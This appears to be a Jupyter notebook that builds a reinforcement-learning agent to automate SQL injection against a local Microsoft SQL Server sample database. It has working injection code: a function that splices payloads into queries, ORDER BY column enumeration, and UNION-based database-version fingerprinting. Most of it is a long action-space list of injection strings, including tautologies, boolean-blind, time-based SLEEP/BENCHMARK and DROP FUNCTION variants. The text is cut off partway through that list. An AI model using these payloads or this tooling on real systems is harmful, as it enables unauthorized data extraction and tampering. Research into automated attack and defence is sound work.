{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**DATABASE CONFIGURATION**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 225,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sqlalchemy.engine import URL\n",
    "from sqlalchemy import create_engine\n",
    "import numpy as np\n",
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "from keras import layers\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import json\n",
    "import sys\n",
    "from enum import Enum\n",
    "import time\n",
    "import hashlib\n",
    "import matplotlib.pyplot as plt\n",
    "from collections import deque"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Load Configuration File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 226,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'database': {'name': 'BikeStores', 'server': '.\\\\SQLEXPRESS', 'driver': 'SQL Server', 'sample_query': 'SELECT * FROM production.brands'}, 'rl': {'state_info': {'mark_error': True}, 'contexts': [{'query': \"SELECT * FROM production.products WHERE brand_id='[INPUT]' AND category_id=8\", 'table_filter': ['production.products'], 'column_filter': ['product_name'], 'goal': 'Trek 820 - 2016'}, {'query': \"SELECT * FROM sales.customers WHERE email='[INPUT]'\", 'table_filter': ['sales.customers'], 'column_filter': ['email'], 'goal': 'debra.burks@yahoo.com'}]}}\n"
     ]
    }
   ],
   "source": [
    "with open('config.json', 'r') as config_file:\n",
    "    config = json.load(config_file)\n",
    "    print(config)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set Up Connection to Microsoft SQL Database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 227,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   brand_id    brand_name\n",
      "0         1       Electra\n",
      "1         2          Haro\n",
      "2         3        Heller\n",
      "3         4   Pure Cycles\n",
      "4         5       Ritchey\n",
      "5         6       Strider\n",
      "6         7  Sun Bicycles\n",
      "7         8         Surly\n",
      "8         9          Trek\n"
     ]
    }
   ],
   "source": [
    "db = config['database']\n",
    "\n",
    "db_name = db['name']\n",
    "db_server = db['server']\n",
    "db_driver = db['driver']\n",
    "\n",
    "# Connect to SQL database using the above parameters.\n",
    "conn_string = f'DRIVER={db_driver};SERVER={db_server};DATABASE={db_name};Trusted_Connection=yes'\n",
    "conn_url = URL.create('mssql+pyodbc', query={'odbc_connect': conn_string})\n",
    "engine = create_engine(conn_url)\n",
    "\n",
    "# Display a dataframe from a sample query if set.\n",
    "if 'sample_query' in db:\n",
    "    sample_query = db['sample_query']\n",
    "    df = pd.read_sql(sample_query, engine)\n",
    "    print(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Get All Tables and Columns to Define Action Space With"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 228,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(['production.categories',\n",
       "  'production.brands',\n",
       "  'production.products',\n",
       "  'sales.customers',\n",
       "  'sales.stores',\n",
       "  'sales.staffs',\n",
       "  'sales.orders',\n",
       "  'sales.order_items',\n",
       "  'production.stocks'],\n",
       " [['category_id', 'category_name'],\n",
       "  ['brand_id', 'brand_name'],\n",
       "  ['product_id',\n",
       "   'product_name',\n",
       "   'brand_id',\n",
       "   'category_id',\n",
       "   'model_year',\n",
       "   'list_price'],\n",
       "  ['customer_id',\n",
       "   'first_name',\n",
       "   'last_name',\n",
       "   'phone',\n",
       "   'email',\n",
       "   'street',\n",
       "   'city',\n",
       "   'state',\n",
       "   'zip_code'],\n",
       "  ['store_id',\n",
       "   'store_name',\n",
       "   'phone',\n",
       "   'email',\n",
       "   'street',\n",
       "   'city',\n",
       "   'state',\n",
       "   'zip_code'],\n",
       "  ['staff_id',\n",
       "   'first_name',\n",
       "   'last_name',\n",
       "   'email',\n",
       "   'phone',\n",
       "   'active',\n",
       "   'store_id',\n",
       "   'manager_id'],\n",
       "  ['order_id',\n",
       "   'customer_id',\n",
       "   'order_status',\n",
       "   'order_date',\n",
       "   'required_date',\n",
       "   'shipped_date',\n",
       "   'store_id',\n",
       "   'staff_id'],\n",
       "  ['order_id', 'item_id', 'product_id', 'quantity', 'list_price', 'discount'],\n",
       "  ['store_id', 'product_id', 'quantity']])"
      ]
     },
     "execution_count": 228,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Gather a list of every user-defined table in the database.\n",
    "# TODO: Verify that every table is retrieved.\n",
    "def get_tables():\n",
    "    tables = []\n",
    "    columns = []\n",
    "    df = pd.read_sql('SELECT * FROM INFORMATION_SCHEMA.COLUMNS', engine)\n",
    "\n",
    "    schemas = df['TABLE_SCHEMA']\n",
    "    table_names = df['TABLE_NAME']\n",
    "    column_names = df['COLUMN_NAME']\n",
    "\n",
    "    prev_table = None\n",
    "    for i in range(0, len(schemas)):\n",
    "        if schemas[i] is not None:\n",
    "            table_name = schemas[i] + '.' + table_names[i]\n",
    "        else:\n",
    "            table_name = table_names[i]\n",
    "            \n",
    "        if table_name not in tables:\n",
    "            tables.append(table_name)\n",
    "\n",
    "        last_table = tables[len(tables)-1]\n",
    "        if prev_table is last_table:\n",
    "            columns[len(columns)-1].append(column_names[i])\n",
    "        else:\n",
    "            prev_table = last_table\n",
    "            columns.append([column_names[i]])\n",
    "        \n",
    "    return tables, columns\n",
    "    \n",
    "tables, columns = get_tables()\n",
    "tables, columns"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define State Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 229,
   "metadata": {},
   "outputs": [],
   "source": [
    "state_info_config = config['rl']['state_info']\n",
    "mark_error = state_info_config['mark_error']\n",
    "action_result_size = 16 # MD5 hash byte count. \n",
    "if mark_error:\n",
    "    action_result_size += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define RL Contexts and Incrementation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 230,
   "metadata": {},
   "outputs": [],
   "source": [
    "contexts = config['rl']['contexts']\n",
    "\n",
    "# Increments RL context and returns whether another context was assigned.\n",
    "def increment_context():\n",
    "    global context, context_index\n",
    "    if context_index < len(contexts) - 1:\n",
    "        context_index += 1\n",
    "        context = contexts[context_index]\n",
    "\n",
    "# Not having any defined RL contexts will result in an error.\n",
    "def reset_context():\n",
    "    global context, context_index\n",
    "    context = contexts[0]\n",
    "    context_index = 0\n",
    "\n",
    "reset_context()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create SQL Injection Attack Capability"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 231,
   "metadata": {},
   "outputs": [],
   "source": [
    "def inject_payload(payload, context):\n",
    "    # Finds [INPUT] within the context query configuration and replaces it with the payload.\n",
    "    query = context['query']\n",
    "    query = query.replace('[INPUT]', payload)\n",
    "    # Runs SQL injection query.\n",
    "    return pd.read_sql(query, engine)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Enumerate SQL Database Types"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 232,
   "metadata": {},
   "outputs": [],
   "source": [
    "class DBType(Enum):\n",
    "    MSSQL = 0\n",
    "    MySQL = 1\n",
    "    Oracle = 2\n",
    "    PostgeSQL = 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Gets Column Counts for Each Context"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 233,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Column counts for table returned by each context.\n",
    "#\n",
    "# PostgreSQL tables can have no columns.\n",
    "# Source: https://stackoverflow.com/questions/2438321/create-a-table-without-columns#:~:text=A%20table%20is%20a%20collection,need%20at%20least%20one%20column.&text=in%20postgresql%20you%20can%20indeed%20create%20tables%20without%20columns.\n",
    "context_col_counts = [0 for c in contexts]\n",
    "\n",
    "for i in range(0, len(contexts)):\n",
    "    # Finds column counts for each context by iterating using ORDER BY until an error occurs.\n",
    "    #\n",
    "    # Max possible number of SQL columns is 30,000, so this loop should always break.\n",
    "    # IBM source: https://www.ibm.com/support/pages/filenet-content-manager-ms-sql-server-database-table-limitations-columns-and-row-size#:~:text=the%20object%20store.-,Answer,30%2C000%20columns%20instead%20of%201024.\n",
    "    while True:\n",
    "        payload = f'\\' ORDER BY {context_col_counts[i]+1}--'\n",
    "        try:\n",
    "            df = inject_payload(payload, contexts[i])\n",
    "            context_col_counts[i] += 1\n",
    "        except:\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tries to Retrieve Database Type by Injecting Version UNION Payloads"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 234,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DBType.MSSQL\n"
     ]
    }
   ],
   "source": [
    "# With the number of columns gathered, we can perform UNION statements to find the\n",
    "# SQL database type and version. To achieve this, we must find a String column for\n",
    "# the version information to be returned in.\n",
    "#\n",
    "# Database version payloads are for Microsoft and MySQL, Oracle, and PostgreSQL respectively.\n",
    "# Retreived from: https://portswigger.net/web-security/sql-injection/examining-the-database\n",
    "db_suffixes = ['@@version', '* FROM v$version', 'version()']\n",
    "db_type = None\n",
    "col_count0 = context_col_counts[0]\n",
    "for suffix in db_suffixes:\n",
    "    for i in range(0, col_count0):\n",
    "        payload = '\\' UNION SELECT '\n",
    "        for j in range(0, col_count0):\n",
    "            if i != j:\n",
    "                payload += 'NULL'\n",
    "            else:\n",
    "                payload += suffix\n",
    "            if j != col_count0 - 1:\n",
    "                payload += ','\n",
    "            else:\n",
    "                payload += '--'\n",
    "        try:\n",
    "            df = inject_payload(payload, context)\n",
    "            res = df.iloc[-1,i]\n",
    "            if suffix == db_suffixes[0]:\n",
    "                if 'Microsoft SQL Server' in res:\n",
    "                    db_type = DBType.MSSQL\n",
    "                else:\n",
    "                    db_type = DBType.MySQL\n",
    "            elif suffix == db_suffixes[1]:\n",
    "                db_type == DBType.Oracle\n",
    "            elif suffix == db_suffixes[2]:\n",
    "                db_type = DBType.PostgeSQL\n",
    "            break\n",
    "        except:\n",
    "            continue\n",
    "\n",
    "# TODO: Use DB type to filter action space.\n",
    "print(db_type)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**REINFORCEMENT LEARNING**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create Action Space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 235,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"' OR 1=1\",\n",
       " \"' OR 1=0\",\n",
       " \"' OR x=x\",\n",
       " \"' OR x=y\",\n",
       " \"' OR 1=1#\",\n",
       " \"' OR 1=0#\",\n",
       " \"' OR x=x#\",\n",
       " \"' OR x=y#\",\n",
       " \"' OR 1=1-- \",\n",
       " \"' OR 1=0-- \",\n",
       " \"' OR x=x-- \",\n",
       " \"' OR x=y-- \",\n",
       " \"' OR 3409=3409 AND ('pytW' LIKE 'pytW\",\n",
       " \"' OR 3409=3409 AND ('pytW' LIKE 'pytY\",\n",
       " \"' HAVING 1=1\",\n",
       " \"' HAVING 1=0\",\n",
       " \"' HAVING 1=1#\",\n",
       " \"' HAVING 1=0#\",\n",
       " \"' HAVING 1=1-- \",\n",
       " \"' HAVING 1=0-- \",\n",
       " \"' AND 1=1\",\n",
       " \"' AND 1=0\",\n",
       " \"' AND 1=1-- \",\n",
       " \"' AND 1=0-- \",\n",
       " \"' AND 1=1#\",\n",
       " \"' AND 1=0#\",\n",
       " \"' AND 1=1 AND '%'='\",\n",
       " \"' AND 1=0 AND '%'='\",\n",
       " \"' AND 1083=1083 AND (1427=1427\",\n",
       " \"' AND 7506=9091 AND (5913=5913\",\n",
       " \"' AND 1083=1083 AND ('1427=1427\",\n",
       " \"' AND 7506=9091 AND ('5913=5913\",\n",
       " \"' AND 7300=7300 AND 'pKlZ'='pKlZ\",\n",
       " \"' AND 7300=7300 AND 'pKlZ'='pKlY\",\n",
       " \"' AND 7300=7300 AND ('pKlZ'='pKlZ\",\n",
       " \"' AND 7300=7300 AND ('pKlZ'='pKlY\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1#\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0#\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1--\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0--\",\n",
       " \"' WHERE 1=1 AND 1=1\",\n",
       " \"' WHERE 1=1 AND 1=0\",\n",
       " \"' WHERE 1=1 AND 1=1#\",\n",
       " \"' WHERE 1=1 AND 1=0#\",\n",
       " \"' WHERE 1=1 AND 1=1--\",\n",
       " \"' WHERE 1=1 AND 1=0--\",\n",
       " \"' ORDER BY 1-- \",\n",
       " \"' ORDER BY 2-- \",\n",
       " \"' ORDER BY 3-- \",\n",
       " \"' ORDER BY 4-- \",\n",
       " \"' ORDER BY 5-- \",\n",
       " \"' ORDER BY 6-- \",\n",
       " \"' ORDER BY 7-- \",\n",
       " \"' ORDER BY 8-- \",\n",
       " \"' ORDER BY 9-- \",\n",
       " \"' ORDER BY 10-- \",\n",
       " \"' ORDER BY 11-- \",\n",
       " \"' ORDER BY 12-- \",\n",
       " \"' ORDER BY 13-- \",\n",
       " \"' ORDER BY 14-- \",\n",
       " \"' ORDER BY 15-- \",\n",
       " \"' ORDER BY 16-- \",\n",
       " \"' ORDER BY 17-- \",\n",
       " \"' ORDER BY 18-- \",\n",
       " \"' ORDER BY 19-- \",\n",
       " \"' ORDER BY 20-- \",\n",
       " \"' ORDER BY 21-- \",\n",
       " \"' ORDER BY 22-- \",\n",
       " \"' ORDER BY 23-- \",\n",
       " \"' ORDER BY 24-- \",\n",
       " \"' ORDER BY 25-- \",\n",
       " \"' ORDER BY 26-- \",\n",
       " \"' ORDER BY 27-- \",\n",
       " \"' ORDER BY 28-- \",\n",
       " \"' ORDER BY 29-- \",\n",
       " \"' ORDER BY 30-- \",\n",
       " \"' ORDER BY 31337-- \",\n",
       " \"' ORDER BY 1# \",\n",
       " \"' ORDER BY 2# \",\n",
       " \"' ORDER BY 3# \",\n",
       " \"' ORDER BY 4# \",\n",
       " \"' ORDER BY 5# \",\n",
       " \"' ORDER BY 6# \",\n",
       " \"' ORDER BY 7# \",\n",
       " \"' ORDER BY 8# \",\n",
       " \"' ORDER BY 9# \",\n",
       " \"' ORDER BY 10# \",\n",
       " \"' ORDER BY 11# \",\n",
       " \"' ORDER BY 12# \",\n",
       " \"' ORDER BY 13# \",\n",
       " \"' ORDER BY 14# \",\n",
       " \"' ORDER BY 15# \",\n",
       " \"' ORDER BY 16# \",\n",
       " \"' ORDER BY 17# \",\n",
       " \"' ORDER BY 18# \",\n",
       " \"' ORDER BY 19# \",\n",
       " \"' ORDER BY 20# \",\n",
       " \"' ORDER BY 21# \",\n",
       " \"' ORDER BY 22# \",\n",
       " \"' ORDER BY 23# \",\n",
       " \"' ORDER BY 24# \",\n",
       " \"' ORDER BY 25# \",\n",
       " \"' ORDER BY 26# \",\n",
       " \"' ORDER BY 27# \",\n",
       " \"' ORDER BY 28# \",\n",
       " \"' ORDER BY 29# \",\n",
       " \"' ORDER BY 30#\",\n",
       " \"' ORDER BY 31337#\",\n",
       " \"' ORDER BY 1 \",\n",
       " \"' ORDER BY 2 \",\n",
       " \"' ORDER BY 3 \",\n",
       " \"' ORDER BY 4 \",\n",
       " \"' ORDER BY 5 \",\n",
       " \"' ORDER BY 6 \",\n",
       " \"' ORDER BY 7 \",\n",
       " \"' ORDER BY 8 \",\n",
       " \"' ORDER BY 9 \",\n",
       " \"' ORDER BY 10 \",\n",
       " \"' ORDER BY 11 \",\n",
       " \"' ORDER BY 12 \",\n",
       " \"' ORDER BY 13 \",\n",
       " \"' ORDER BY 14 \",\n",
       " \"' ORDER BY 15 \",\n",
       " \"' ORDER BY 16 \",\n",
       " \"' ORDER BY 17 \",\n",
       " \"' ORDER BY 18 \",\n",
       " \"' ORDER BY 19 \",\n",
       " \"' ORDER BY 20 \",\n",
       " \"' ORDER BY 21 \",\n",
       " \"' ORDER BY 22 \",\n",
       " \"' ORDER BY 23 \",\n",
       " \"' ORDER BY 24 \",\n",
       " \"' ORDER BY 25 \",\n",
       " \"' ORDER BY 26 \",\n",
       " \"' ORDER BY 27 \",\n",
       " \"' ORDER BY 28 \",\n",
       " \"' ORDER BY 29 \",\n",
       " \"' ORDER BY 30 \",\n",
       " \"' ORDER BY 31337 \",\n",
       " \"' RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
       " \"' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
       " \"' IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\",\n",
       " \"' IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\",\n",
       " \"' %' AND 8310=8310 AND '%'='\",\n",
       " \"' %' AND 8310=8311 AND '%'='\",\n",
       " \"' ORDER BY SLEEP(5)\",\n",
       " \"' ORDER BY 1,SLEEP(5)\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\",\n",
       " \"' ORDER BY SLEEP(5)#\",\n",
       " \"' ORDER BY 1,SLEEP(5)#\",\n",
       " \"' ORDER BY 1,SLEEP(5),3#\",\n",
       " \"' ORDER BY 1,SLEEP(5),3,4#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\",\n",
       " \"' ORDER BY SLEEP(5)-- \",\n",
       " \"' ORDER BY 1,SLEEP(5)-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),3-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),3,4-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \",\n",
